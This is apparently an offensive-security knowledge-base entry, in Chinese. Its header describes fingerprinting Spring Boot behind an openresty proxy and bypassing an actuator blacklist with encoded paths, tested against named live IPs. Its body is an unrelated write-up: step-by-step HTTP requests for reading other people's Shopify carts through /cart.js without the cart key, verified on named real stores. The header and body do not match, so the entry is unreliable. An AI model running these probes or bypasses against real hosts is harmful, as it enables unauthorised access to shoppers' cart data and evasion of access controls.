# 反代后 Spring Boot 框架面分型：/error 直连 status 999 + Whitelabel 284B 判 2.x，前缀剥离用 404 path 自证

- **code**: 反代后-spring-boot-框架面分型-error-直连-status-999-whitelabel-284b
- **kind**: payload
- **category**: info-leak
- **component**: Spring Boot 2.x / openresty 反代
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-05 在 https://35.241.95.15:32325 与 https://35.220.211.187:2222 实测：/api/nonexistent-9614probe → 404/100B path=/nonexistent-9614probe；/api/error → 500/63B {"status":999,"error":"None"}；/api/customer/getByLoginName 带 Accept:text/html → 405/284B Whitelabel；/api/actuator/env 等 9 条 → openresty 403/561B，8 种变体全 403，仅 /api/actuator%3B/env → 200/12B {"code":401}；畸形 JSON POST → 200/92B GW_899995。
- **tags**: spring-boot,recon,fingerprint,whitelabel,actuator,reverse-proxy,path-encoding
- **created_at**: 2026-11-04T21:11:17.841Z
- **engine**: https://35.241.95.15:32325
- **found_by**: work

## 描述

前端 nginx/openresty 把 /api 前缀剥离后转发到 Spring Boot 时，三步定性框架与暴露面：①GET /api/随机串 → 404 JSON 且 path 字段已去掉 /api，证明前缀剥离并直通后端；②GET /api/error → 500 {"status":999,"error":"None"} 是 DefaultErrorAttributes 无 status 属性的经典形态（BasicErrorController 可达）；③对已存在映射发 GET 并带 Accept:text/html → 405/284B "Whitelabel Error Page ... type=Method Not Allowed"，284B 形态定 Spring Boot 2.x（3.x 走 problem detail）。若 actuator/swagger/druid/v3-api-docs/doc.html 回 openresty 自家 561B 403，说明前端有显式黑名单而非整站拒绝：用 /api/任取含 actuator 子串的未映射路径验证"非子串匹配"，再用 %61/%2F/%3B/大小写/双斜杠/点段等变体判可否穿透；%3B 变体绕过黑名单后若得到网关形状（如 {"code":401}），说明黑名单在 openresty、鉴权在网关，属于可交回的未定分型而非 actuator 泄露。注意与 GW_ 前缀错误码（如 GW_899995 请求参数不合法）区分：出现 GW_ 码说明请求死在独立网关层，不能据此判"接口不存在/鉴权正常"。

## 用法

```
curl -sk "https://host:port/api/nonexistent-xyz"（看 404 JSON 的 path 是否已剥离前缀）→ curl -sk "https://host:port/api/error"（999/None 指纹）→ curl -sk -H "Accept: text/html" "https://host:port/api/已知GET映射"（284B Whitelabel 判 2.x）→ curl -sk "https://host:port/api/actuator/env"（403 则再试 %61/%2F/%3B/大小写/// 变体）
```

## 正文

```
# Shopify Ajax Cart API /cart.js 忽略 cookie 里的 ?key —— 仅凭 handle 未认证读他人购物车

## 一句话
Shopify 托管店的 AJAX 购物车读端点 `GET /cart.js` 从 cookie `cart=<handle>?key=<key>` 解析购物车时**不校验 `?key` 能力分量**：去掉 key（cookie 只留 25 位 handle）或改成任意错误 key，均返回该购物车的完整内容（`token` 被归一化为 handle，`item_count`/行项目/金额/重量照常返回）。购物车仅凭 25 位随机 handle 即可被未认证第三方读取。

与 Storefront GraphQL 的 `cart(id:)` / `node(id:)`（KB#524 / KB#542）同样忽略 `?key`，属**同一读路径访问控制不一致**，但**机制不同、是两个独立出口**：
- HTTP cookie AJAX 面：`GET /cart.js`（本条）
- GraphQL API 面：`POST /api/graphql` `cart(id:)/node(id:)`（KB#524 / KB#542）

## 前提
- 目标为 Shopify 托管店，AJAX Cart API 匿名可达（`GET /cart.js` 返回 `{"token":...}`）。
- 需一个有效的 25 位购物车 handle。来源：分享的购物车/结账链接、`/cart.js` 响应的 `token` 字段、店面 HTML 里的 `window.ShopifyAnalytics.meta.cart.id`、Referer、访问日志。
- 无需任何账号 / Cookie / Token（全匿名）。
- 为观察写入需一个可加购的 variant id。

## 复现（无凭据）

### 0) 建基线车，证明 AJAX cart cookie 值形如 `<25位handle>?key=<32hex>`（与 GraphQL cart GID 同构）
```
POST /cart/add.js HTTP/2
Host: <shop>
Content-Type: application/json
(无 Cookie)

{"items":[{"id":<VARIANT_ID>,"quantity":1}]}
-> 200
   set-cookie: cart=<25位handle>%3Fkey%3D<32hex>; path=/; SameSite=Lax; expires=...
   (体内为新增 line item 对象)
```

### 1) 带正确 key 的基线
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<25位handle>%3Fkey%3D<32hex>
-> 200 {"token":"<handle>?key=<32hex>","item_count":1,"original_total_price":...,...}
```

### 2) 决定性：不带 key，仅凭 handle 读回同一车 → 读路径不校验 ?key
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<25位handle>          (去掉 ?key)
-> 200 {"token":"<handle>","item_count":1,"original_total_price":...}   ← 同一车
```

### 3) 带任意错误 key 仍返回该车 → key 完全未被校验（非宽松匹配）
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<handle>%3Fkey%3Ddeadbeefdeadbeefdeadbeefdeadbeef
-> 200 {"token":"<handle>","item_count":1,...}   ← 仍返回该车，token 归一化为 handle
```

### 4) 阴性对照：不存在的 handle → 空车 + 随机新 token（排除“200 恒返回数据”的兜底误报）
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=AAAAAAAAAAAAAAAAAAAAAAAAA
-> 200 {"token":"<新随机>","item_count":0,"items":[],...}
```

### 5) 写路径对照：无 key 时改的是新建空车，目标车不受影响（写路径要求 key）
```
POST /cart/change.js HTTP/2
Host: <shop>
Content-Type: application/json
Cookie: cart=<handle>          (无 key)

{"id":"<VARIANT>:<hash>","quantity":3}
-> 200 {"token":"<新token>","item_count":0,...,"items_added":[],"items_removed":[]}
```
（`/cart/update.js` 带错 key → 422）

## 判定 / 边界
- 判据：**去掉或改错 `?key` 仍返回同一 handle 的同一购物车**；随机 handle 必须回落空车。
- 读路径宽松、写路径（`/cart/add.js`、`/cart/change.js`、`/cart/update.js`、GraphQL `cartLinesAdd` 等）仍严格要求 key → 是访问控制不一致（非完全无鉴权），无跨对象写入。
- 影响面：需先获得 25 位 base62 handle（不可枚举）；价值在 handle 泄漏场景（分享结账链接 / Analytics 全局变量 / Referer / 日志）下放大为他人购物车轮项目与金额泄露。

## 跨靶标复现（同一缺陷，多店交叉验证）
- **retro-refresh.com（task#9）**：`GET /cart.js` 仅带 `Cookie: cart=<25位handle>`（去掉 ?key）→ 200 返回该 handle 对应他人购物车全量（含 line properties `victim=VFR9-VICTIM`、`total_price 24900`）；攻击者完全独立无 cookie 会话亦可通过 GraphQL 读同车；店面 HTML 内嵌 `window.ShopifyAnalytics.meta.cart.id="<handle>"`（JS 可读、非 HttpOnly）；写路径仍强制 key。
- **goffsgames.co.uk（task#11, finding_id=80）**：建车 `POST /cart/add.js {"items":[{"id":65471046386013,"quantity":1}]}` → Set-Cookie `cart=<25位handle>%3Fkey%3D<32hex>`；带正确 key 读 → `{"token":"<handle>?key=...","item_count":1,"original_total_price":3999}`；**去掉 key → 200 同一车 `item_count:1`**；带 `?key=deadbeef...` 错 key → 200 仍返回同一车；随机 handle → `item_count:0` 空车；写路径对照 `/cart/change.js` 无 key → `item_count:0`（新建空车）、`/cart/update.js` 错 key → 422。

## 实测样例（脱敏，goffsgames.co.uk task#11）
- handle：`hWNJ1mzYJfSmCW7tczd8...`（key `36feff66...`，读路径均未携带）
- 不带 / 错误 key 读均返回同一车 `item_count:1`、`original_total_price:3999`
- 原始响应落盘 `/opt/artex/data/tasks/11/i743/`（ev_b_*.json/.out、t1–t4.out、w1b–w3b.out）

## 失败常见原因
- handle 非 25 位 base62；cookie 名必须是 `cart`，`?key` 部分需 URL 编码为 `%3Fkey%3D`；
- 目标店铺关闭 AJAX Cart 或 Storefront token 未公开（返回 401/403 或 HTML）；
- WAF 限速：单线程、请求间隔 ≥3s。
```
